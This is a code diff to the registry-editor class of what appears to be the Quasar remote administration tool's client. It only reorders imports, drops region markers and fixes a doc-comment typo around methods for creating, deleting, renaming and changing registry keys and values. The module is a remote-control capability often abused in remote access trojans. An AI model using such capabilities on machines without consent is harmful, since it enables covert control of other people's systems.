@@ -1,27 +1,18 @@
-﻿using System;
-using Microsoft.Win32;
+﻿using Microsoft.Win32;
 using Quasar.Client.Extensions;
 using Quasar.Client.Helper;
 using Quasar.Common.Models;
+using System;
 
 namespace Quasar.Client.Registry
 {
     public class RegistryEditor
     {
-
-        #region CONSTANTS
-
-        #region RegistryKey
-
         private const string REGISTRY_KEY_CREATE_ERROR = "Cannot create key: Error writing to the registry";
 
         private const string REGISTRY_KEY_DELETE_ERROR = "Cannot delete key: Error writing to the registry";
 
         private const string REGISTRY_KEY_RENAME_ERROR = "Cannot rename key: Error writing to the registry";
-
-        #endregion
-
-        #region RegistryValue
 
         private const string REGISTRY_VALUE_CREATE_ERROR = "Cannot create value: Error writing to the registry";
 
@@ -31,17 +22,12 @@ namespace Quasar.Client.Registry
 
         private const string REGISTRY_VALUE_CHANGE_ERROR = "Cannot change value: Error writing to the registry";
 
-        #endregion
-
-        #endregion
-
-        #region RegistryKey
         /// <summary>
         /// Attempts to create the desired sub key to the specified parent.
         /// </summary>
         /// <param name="parentPath">The path to the parent for which to create the sub-key on.</param>
         /// <param name="name">output parameter that holds the name of the sub-key that was create.</param>
-        /// <param name="errorMsg">output parameter that contians possible error message.</param>
+        /// <param name="errorMsg">output parameter that contains possible error message.</param>
         /// <returns>Returns true if action succeeded.</returns>
         public static bool CreateRegistryKey(string parentPath, out string name, out string errorMsg)
         {
@@ -96,7 +82,7 @@ namespace Quasar.Client.Registry
         /// </summary>
         /// <param name="name">The name of the sub-key to delete.</param>
         /// <param name="parentPath">The path to the parent for which to delete the sub-key on.</param>
-        /// <param name="errorMsg">output parameter that contians possible error message.</param>
+        /// <param name="errorMsg">output parameter that contains possible error message.</param>
         /// <returns>Returns true if the operation succeeded.</returns>
         public static bool DeleteRegistryKey(string name, string parentPath, out string errorMsg)
         {
@@ -145,7 +131,7 @@ namespace Quasar.Client.Registry
         /// <param name="oldName">The name of the key to rename.</param>
         /// <param name="newName">The name to use for renaming.</param>
         /// <param name="parentPath">The path of the parent for which to rename the key.</param>
-        /// <param name="errorMsg">output parameter that contians possible error message.</param>
+        /// <param name="errorMsg">output parameter that contains possible error message.</param>
         /// <returns>Returns true if the operation succeeded.</returns>
         public static bool RenameRegistryKey(string oldName, string newName, string parentPath, out string errorMsg)
         {
@@ -189,17 +175,13 @@ namespace Quasar.Client.Registry
             }
         }
 
-        #endregion
-
-        #region RegistryValue
-
         /// <summary>
         /// Attempts to create the desired value for the specified parent.
         /// </summary>
         /// <param name="keyPath">The path to the key for which to create the registry value on.</param>
         /// <param name="kind">The type of the registry value to create.</param>
         /// <param name="name">output parameter that holds the name of the registry value that was create.</param>
-        /// <param name="errorMsg">output parameter that contians possible error message.</param>
+        /// <param name="errorMsg">output parameter that contains possible error message.</param>
         /// <returns>Returns true if the operation succeeded.</returns>
         public static bool CreateRegistryValue(string keyPath, RegistryValueKind kind, out string name, out string errorMsg)
         {
@@ -252,7 +234,7 @@ namespace Quasar.Client.Registry
         /// </summary>
         /// <param name="keyPath">The path to the key for which to delete the registry value on.</param>
         /// /// <param name="name">The name of the registry value to delete.</param>
-        /// <param name="errorMsg">output parameter that contians possible error message.</param>
+        /// <param name="errorMsg">output parameter that contains possible error message.</param>
         /// <returns>Returns true if the operation succeeded.</returns>
         public static bool DeleteRegistryValue(string keyPath, string name, out string errorMsg)
         {
@@ -301,7 +283,7 @@ namespace Quasar.Client.Registry
         /// <param name="oldName">The name of the registry value to rename.</param>
         /// <param name="newName">The name to use for renaming.</param>
         /// <param name="keyPath">The path of the key for which to rename the registry value.</param>
-        /// <param name="errorMsg">output parameter that contians possible error message.</param>
+        /// <param name="errorMsg">output parameter that contains possible error message.</param>
         /// <returns>Returns true if the operation succeeded.</returns>
         public static bool RenameRegistryValue(string oldName, string newName, string keyPath, out string errorMsg)
         {
@@ -352,7 +334,7 @@ namespace Quasar.Client.Registry
         /// RegValueData object.</param>
         /// <param name="keyPath">The path to the key for which to change the 
         /// value of the registry value on.</param>
-        /// <param name="errorMsg">output parameter that contians possible error message.</param>
+        /// <param name="errorMsg">output parameter that contains possible error message.</param>
         /// <returns>Returns true if the operation succeeded.</returns>
         public static bool ChangeRegistryValue(RegValueData value, string keyPath, out string errorMsg)
         {
@@ -394,8 +376,6 @@ namespace Quasar.Client.Registry
             }
 
         }
-
-        #endregion
 
         public static RegistryKey GetWritableRegistryKey(string keyPath)
         {
